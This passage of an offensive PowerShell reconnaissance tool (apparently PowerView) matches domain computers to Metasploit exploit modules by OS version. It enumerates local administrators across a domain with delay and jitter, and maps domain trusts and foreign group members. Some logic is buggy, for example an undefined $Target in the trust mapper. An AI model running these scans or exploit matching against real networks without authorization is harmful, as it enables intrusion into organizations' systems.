        $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
        $Null = $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
        $Null = $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103")  
        $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/")  
        $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983")  
        $Null = $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  
        $Null = $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729")  
        $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/")  
        $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059")  
        $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439")  
        $Null = $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250")  

        # Status user        
        Write-Verbose "[*] Checking computers for vulnerable OS and SP levels..."

        # ----------------------------------------------------------------
        # Setup data table to store vulnerable systems
        # ----------------------------------------------------------------

        # Create data table to house vulnerable server list
        $TableVulnComputers = New-Object System.Data.DataTable 
        $Null = $TableVulnComputers.Columns.Add('ComputerName')
        $Null = $TableVulnComputers.Columns.Add('OperatingSystem')
        $Null = $TableVulnComputers.Columns.Add('ServicePack')
        $Null = $TableVulnComputers.Columns.Add('LastLogon')
        $Null = $TableVulnComputers.Columns.Add('MsfModule')
        $Null = $TableVulnComputers.Columns.Add('CVE')

        # Iterate through each exploit
        $TableExploits | ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE

            # Iterate through each ADS computer
            $TableAdsComputers | ForEach-Object {
                
                $AdsHostname = $_.Hostname
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.ServicePack                                                        
                $AdsLast = $_.LastLogon
                
                # Add exploitable systems to vul computers data table
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ) {                    
                    # Add domain computer to data table                    
                    $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve)
                }
            }
        }     
        
        # Display results
        $VulnComputer = $TableVulnComputers | Select-Object ComputerName -Unique | Measure-Object
        $vulnComputerCount = $VulnComputer.Count
        If ($VulnComputer.Count -gt 0) {
            # Return vulnerable server list order with some hack date casting
            Write-Verbose "[+] Found $vulnComputerCount potentially vulnerabile systems!"
            $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending

        }else {
            Write-Verbose "[-] No vulnerable systems were found."
        }
    }
    End
    {
    }
}


function Invoke-EnumerateLocalAdmin {
<#
    .SYNOPSIS

        Enumerates members of the local Administrators groups
        across all machines in the domain.

        Author: @harmj0y
        License: BSD 3-Clause

    .DESCRIPTION

        This function queries the domain for all active machines with
        Get-NetComputer, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

    .PARAMETER Hosts

        Host array to enumerate, passable on the pipeline.

    .PARAMETER HostList

        List of hostnames/IPs to search.

    .PARAMETER HostFilter

        Host filter name to query AD for, wildcards accepted.

    .PARAMETER HostADSpath

        The LDAP source to search through for hosts, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER NoPing

        Don't ping each host to ensure it's up before enumerating.

    .PARAMETER Delay

        Delay between enumerating hosts, defaults to 0

    .PARAMETER Jitter

        Jitter for the host delay, defaults to +/- 0.3

    .PARAMETER OutFile

        Output results to a specified csv output file.

    .PARAMETER TrustGroups

        Only return results that are not part of the local machine
        or the machine's domain. Old Invoke-EnumerateLocalTrustGroup
        functionality.

    .PARAMETER Domain

        Domain to query for machines, defaults to the current domain.

    .PARAMETER Threads

        The maximum concurrent threads to execute.

    .EXAMPLE

        PS C:\> Invoke-EnumerateLocalAdmin

        Enumerates the members of local administrators for all machines
        in the current domain.

    .EXAMPLE

        PS C:\> Invoke-EnumerateLocalAdmin -Threads 10

        Threaded local admin enumeration, replaces Invoke-EnumerateLocalAdminThreaded

    .LINK

        http://blog.harmj0y.net/
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String[]]
        $Hosts,

        [String]
        $HostList,

        [String]
        $HostFilter,

        [String]
        $HostADSpath,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $OutFile,

        [Switch]
        $TrustGroups,

        [String]
        $Domain,

        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # random object for delay
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-EnumerateLocalAdmin with delay of $Delay"

        if(!$Hosts) { 

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                # get ALL the domains in the forest to search
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                # use the local domain
                $TargetDomains = @( (Get-NetDomain).name )
            }

            # if we're using a host list, read the targets in and add them to the target list
            if($HostList) {
                if (Test-Path -Path $HostList) {
                    $Hosts = Get-Content -Path $HostList
                }
                else {
                    throw "[!] Input file '$HostList' doesn't exist!"
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"
                    $Hosts = Get-NetComputer -Domain $Domain -Filter $HostFilter -ADSpath $HostADSpath
                }
            }

            # remove any null target hosts, uniquify the list and shuffle it
            # $Hosts = $Hosts | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            $Hosts = $Hosts | Where-Object { $_ } | Sort-Object { Get-Random }
            $HostCount = $Hosts.Count
            if($HostCount -eq 0) {
                throw "No hosts found!"
            }
        }

        # delete any existing output file if it already exists
        if ($OutFile -and (Test-Path -Path $OutFile)) { Remove-Item -Path $OutFile }

        if($TrustGroups) {
            
            Write-Verbose "Determining domain trust groups"

            # find all group names that have one or more users in another domain
            $TrustGroupNames = Find-ForeignGroup -Domain $Domain | ForEach-Object { $_.GroupName } | Sort-Object -Unique

            $TrustGroupsSIDs = $TrustGroupNames | ForEach-Object { 
                # ignore the builtin administrators group for a DC (S-1-5-32-544)
                # TODO: ignore all default built in sids?
                Get-NetGroup -Domain $Domain -GroupName $_ -FullData | Where-Object { $_.objectsid -notmatch "S-1-5-32-544" } | ForEach-Object { $_.objectsid }
            }

            # query for the primary domain controller so we can extract the domain SID for filtering
            $DomainSID = Get-DomainSID -Domain $Domain
        }

        # script block that enumerates a server
        $HostEnumBlock = {
            param($Server, $Ping, $OutFile, $DomainSID, $TrustGroupsSIDs)

            # optionally check if the server is up first
            $Up = $True
            if($Ping) {
                $Up = Test-Server -Server $Server
            }
            if($Up) {
                # grab the users for the local admins on this server
                $LocalAdmins = Get-NetLocalGroup -HostName $Server

                # if we just want to return cross-trust users
                if($DomainSID -and $TrustGroupSIDS) {
                    # get the local machine SID
                    $LocalSID = ($localAdmins | Where-Object { $_.SID -match '.*-500$' }).SID -replace "-500$"

                    # filter out accounts that begin with the machine SID and domain SID
                    #   but preserve any groups that have users across a trust ($TrustGroupSIDS)
                    $LocalAdmins = $LocalAdmins | Where-Object { ($TrustGroupsSIDs -contains $_.SID) -or ((-not $_.SID.startsWith($LocalSID)) -and (-not $_.SID.startsWith($DomainSID))) }
                }

                if($LocalAdmins -and ($LocalAdmins.Length -ne 0)) {
                    # output the results to a csv if specified
                    if($OutFile) {
                        $LocalAdmins | Export-PowerViewCSV -OutFile $OutFile
                    }
                    else {
                        # otherwise return the user objects
                        $LocalAdmins
                    }
                }
                else {
                    Write-Verbose "[!] No users returned from $Server"
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            # if we're using threading, kick off the script block with Invoke-ThreadedFunction
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'OutFile' = $OutFile
                'DomainSID' = $DomainSID
                'TrustGroupsSIDs' = $TrustGroupsSIDs
            }

            # kick off the threaded script block + arguments 
            Invoke-ThreadedFunction -Hosts $Hosts -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams
        }

        else {
            if(-not $NoPing -and ($Hosts.count -ne 1)) {
                # ping all hosts in parallel
                $Ping = {param($Server) if(Test-Connection -ComputerName $Server -Count 1 -Quiet -ErrorAction Stop){$Server}}
                $Hosts = Invoke-ThreadedFunction -NoImports -Hosts $Hosts -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($Hosts.count)"
            $Counter = 0

            ForEach ($Server in $Hosts) {

                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Server ($Counter of $($Hosts.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Server, $False, $OutFile, $DomainSID, $TrustGroupsSIDs
                $Result
            }
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-NetDomainTrust {
<#
    .SYNOPSIS

        Return all domain trusts for the current domain or
        a specified domain.

    .PARAMETER Domain

        The domain whose trusts to enumerate, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect queries through.

    .PARAMETER LDAP

        Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

    .EXAMPLE

        PS C:\> Get-NetDomainTrust

        Return domain trusts for the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomainTrust -Domain "test"

        Return domain trusts for the "test" domain.
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP
    )

    if($LDAP) {

        $TrustSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController

        if($TrustSearcher) {
            if(!$Domain) {
                $Domain = (Get-NetDomain).Name
            }

            $TrustSearcher.filter = '(&(objectClass=trustedDomain))'
            $TrustSearcher.PageSize = 200

            $TrustSearcher.FindAll() | ForEach-Object {
                $Props = $_.Properties
                $DomainTrust = New-Object PSObject
                $TrustAttrib = Switch ($Props.trustattributes)
                {
                    0x001 { "non_transitive" }
                    0x002 { "uplevel_only" }
                    0x004 { "quarantined_domain" }
                    0x008 { "forest_transitive" }
                    0x010 { "cross_organization" }
                    0x020 { "within_forest" }
                    0x040 { "treat_as_external" }
                    0x080 { "trust_uses_rc4_encryption" }
                    0x100 { "trust_uses_aes_keys" }
                    Default { 
                        Write-Warning "Unknown trust attribute: $($Props.trustattributes)";
                        "$($Props.trustattributes)";
                    }
                }
                $Direction = Switch ($Props.trustdirection) {
                    0 { "Disabled" }
                    1 { "Inbound" }
                    2 { "Outbound" }
                    3 { "Bidirectional" }
                }
                $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                $DomainTrust | Add-Member Noteproperty 'SourceName' $Domain
                $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                $DomainTrust | Add-Member Noteproperty 'ObjectGuid' "{$ObjectGuid}"
                $DomainTrust | Add-Member Noteproperty 'TrustType' "$TrustAttrib"
                $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                $DomainTrust
            }
        }
    }

    else {
        # if we're using direct domain connections
        (Get-NetDomain -Domain $Domain).GetAllTrustRelationships()
    }
}


function Get-NetForestTrust {
<#
    .SYNOPSIS

        Return all trusts for the current forest.

    .PARAMETER Forest

        Return trusts for the specified forest.

    .EXAMPLE

        PS C:\> Get-NetForestTrust

        Return current forest trusts.

    .EXAMPLE

        PS C:\> Get-NetForestTrust -Forest "test"

        Return trusts for the "test" forest.
#>

    [CmdletBinding()]
    param(
        [String]
        $Forest
    )

    (Get-NetForest -Forest $Forest).GetAllTrustRelationships()
}


function Find-ForeignUser {
<#
    .SYNOPSIS

        Enumerates users who are in groups outside of their
        principal domain. The -Recurse option will try to map all 
        transitive domain trust relationships and enumerate all 
        users who are in groups outside of their principal domain.

    .PARAMETER UserName

        Username to filter results for, wildcards accepted.

    .PARAMETER Domain

        Domain to query for users, defaults to the current domain.

    .PARAMETER Recurse

        Enumerate all user trust groups from all reachable domains recursively.

    .LINK

        http://blog.harmj0y.net/
#>

    [CmdletBinding()]
    param(
        [String]
        $UserName,

        [String]
        $Domain,

        [Switch]
        $Recurse
    )

    function Get-ForeignUser {
        # helper used to enumerate users who are in groups outside of their principal domain
        param(
            [String]
            $UserName,

            [String]
            $Domain
        )

        if ($Domain) {
            # get the domain name into distinguished form
            $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
        }
        else {
            $DistinguishedDomainName = [String] ([adsi]'').distinguishedname
            $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
        }

        Get-NetUser -Domain $Domain -UserName $UserName | Where-Object {$_.memberof} | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf("DC=")
                if($Index) {
                    
                    $GroupDomain = $($Membership.substring($Index)) -replace 'DC=','' -replace ',','.'
                    
                    if ($GroupDomain.CompareTo($Domain)) {
                        # if the group domain doesn't match the user domain, output
                        $GroupName = $Membership.split(",")[0].split("=")[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $Domain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDN' $Membership
                        $ForeignUser
                    }
                }
            }
        }
    }

    if ($Recurse) {
        # get all rechable domains in the trust mesh and uniquify them
        $DomainTrusts = Invoke-MapDomainTrust -Recurse | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique

        ForEach($DomainTrust in $DomainTrusts) {
            # get the trust groups for each domain in the trust mesh
            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            Get-ForeignUser -Domain $DomainTrust -UserName $UserName
        }
    }
    else {
        Get-ForeignUser -Domain $Domain -UserName $UserName
    }
}


function Find-ForeignGroup {
    <#
        .SYNOPSIS
        Enumerates all the members of a given domain's groups
        and finds users that are not in the queried domain.
        The -Recurse flag will perform this enumeration for all
        eachable domain trusts.

        .PARAMETER GroupName
        Groupname to filter results for, wildcards accepted.

        .PARAMETER Domain
        Domain to query for groups, defaults to the current domain.

        .PARAMETER Recurse
        Enumerate all group trust users from all reachable domains recursively.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [String]
        $GroupName,

        [String]
        $Domain,

        [Switch]
        $Recurse
    )

    function Get-ForeignGroup {
        param(
            [String]
            $GroupName,

            [String]
            $Domain
        )

        if(-not $Domain) {
            $Domain = (Get-NetDomain).Name
        }

        $DomainDN = "DC=$($Domain.Replace('.', ',DC='))"
        Write-Verbose "DomainDN: $DomainDN"

        # standard group names to ignore
        $ExcludeGroups = @("Users", "Domain Users", "Guests")

        # get all the groupnames for the given domain
        Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData | Where-Object {$_.member} | Where-Object {
            # exclude common large groups
            -not ($ExcludeGroups -contains $_.samaccountname) } | ForEach-Object {
                
                $GroupName = $_.samAccountName

                $_.member | ForEach-Object {
                    # filter for foreign SIDs in the cn field for users in another domain,
                    #   or if the DN doesn't end with the proper DN for the queried domain  
                    if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.substring($_.IndexOf("DC="))))) {

                        $UserDomain = $_.subString($_.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        $UserName = $_.split(",")[0].split("=")[1]

                        $ForeignGroupUser = New-Object PSObject
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupDomain' $Domain
                        $ForeignGroupUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                        $ForeignGroupUser | Add-Member Noteproperty 'UserName' $UserName
                        $ForeignGroupUser | Add-Member Noteproperty 'UserDN' $_
                        $ForeignGroupUser
                    }
                }
        }
    }

    if ($Recurse) {
        # get all rechable domains in the trust mesh and uniquify them
        $DomainTrusts = Invoke-MapDomainTrust -Recurse | ForEach-Object { $_.SourceDomain } | Sort-Object -Unique

        ForEach($DomainTrust in $DomainTrusts) {
            # get the trust groups for each domain in the trust mesh
            Write-Verbose "Enumerating trust groups in domain $DomainTrust"
            Get-ForeignGroup -Domain $Domain -GroupName $GroupName
        }
    }
    else {
        Get-ForeignGroup -Domain $Domain -UserName $UserName
    }
}


function Invoke-MapDomainTrust {
<#
    .SYNOPSIS

        Try to map all transitive domain trust relationships.

    .DESCRIPTION

        This function gets all trusts for the current domain,
        and tries to get all trusts for each domain it finds.

    .PARAMETER LDAP

        Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.
        More likely to get around network segmentation, but not as accurate.

    .EXAMPLE

        PS C:\> Invoke-MapDomainTrust | Export-CSV -NoTypeInformation trusts.csv
        
        Map all reachable domain trusts and output everything to a .csv file.

    .LINK

        http://blog.harmj0y.net/
#>
    [CmdletBinding()]
    param(
        [Switch]
        $LDAP
    )

    # keep track of domains seen so we don't hit infinite recursion
    $SeenDomains = @{}

    # our domain status tracker
    $Domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $CurrentDomain = (Get-NetDomain).Name
    $Domains.push($CurrentDomain)

    while($Domains.Count -ne 0) {

        $Domain = $Domains.Pop()

        # if we haven't seen this domain before
        if (-not $SeenDomains.ContainsKey($Domain)) {

            # mark it as seen in our list
            $Null = $SeenDomains.add($Domain, "")

            try {
                # get all the trusts for this domain
                if($LDAP) {
                    $Trusts = Get-NetDomainTrust -Domain $Domain -LDAP
                }
                else {
                    $Trusts = Get-NetDomainTrust -Domain $Domain
                }

                if ($Trusts) {

                    # enumerate each trust found
                    ForEach ($Trust in $Trusts) {
                        $SourceDomain = $Trust.SourceName
                        $TargetDomain = $Trust.TargetName
                        $TrustType = $Trust.TrustType
                        $TrustDirection = $Trust.TrustDirection

                        # make sure we process the target
                        $Null = $Domains.push($Target)

                        # build the nicely-parsable custom output object
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceDomain' "$SourceDomain"
                        $DomainTrust | Add-Member Noteproperty 'TargetDomain' "$TargetDomain"
                        $DomainTrust | Add-Member Noteproperty 'TrustType' "$TrustType"
                        $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$TrustDirection"
                        $DomainTrust
                    }
                }
            }
            catch {
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect. 
# Warning: Once these are executed, they are baked in 
# and can't be changed while the script is running!
#
########################################################

$Mod = New-InMemoryModule -ModuleName Win32

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(),  [Int32].MakeByRefType())),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType())),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)

# enum used by $WTS_SESSION_INFO_1 below
$WTSConnectState = psenum $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}

# the WTSEnumerateSessionsEx result structure
$WTS_SESSION_INFO_1 = struct $Mod WTS_SESSION_INFO_1 @{
    ExecEnvId = field 0 UInt32
    State = field 1 $WTSConnectState
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}

# the particular WTSQuerySessionInformation result structure
$WTS_CLIENT_ADDRESS = struct $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}


$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
$Wtsapi32 = $Types['wtsapi32']

# aliases to help the PowerView 2.0 transition
Set-Alias Get-NetForestDomains Get-NetForestDomain
Set-Alias Get-NetDomainControllers Get-NetDomainController
Set-Alias Get-NetUserSPNs Get-NetUser
Set-Alias Invoke-NetUserAdd Add-NetUser
Set-Alias Invoke-NetGroupUserAdd Add-NetGroupUser
Set-Alias Get-NetComputers Get-NetComputer
Set-Alias Get-NetOUs Get-NetOU
Set-Alias Get-NetGUIDOUs Get-NetOU
Set-Alias Get-NetFileServers Get-NetFileServer
Set-Alias Get-NetSessions Get-NetSession
Set-Alias Get-NetRDPSessions Get-NetRDPSession
Set-Alias Get-NetProcesses Get-NetProcess
Set-Alias Get-UserLogonEvents Get-UserEvent
Set-Alias Get-UserTGTEvents Get-UserEvent
Set-Alias Get-UserProperties Get-UserProperty
Set-Alias Get-ComputerProperties Get-ComputerProperty
Set-Alias Invoke-UserHunterThreaded Invoke-UserHunter
Set-Alias Invoke-ProcessHunterThreaded Invoke-ProcessHunter
Set-Alias Invoke-ShareFinderThreaded Invoke-ShareFinder
Set-Alias Invoke-SearchFiles Invoke-FileSearch
Set-Alias Invoke-UserFieldSearch Find-UserField
Set-Alias Invoke-ComputerFieldSearch Find-ComputerField
Set-Alias Invoke-FindLocalAdminAccess Find-LocalAdminAccess
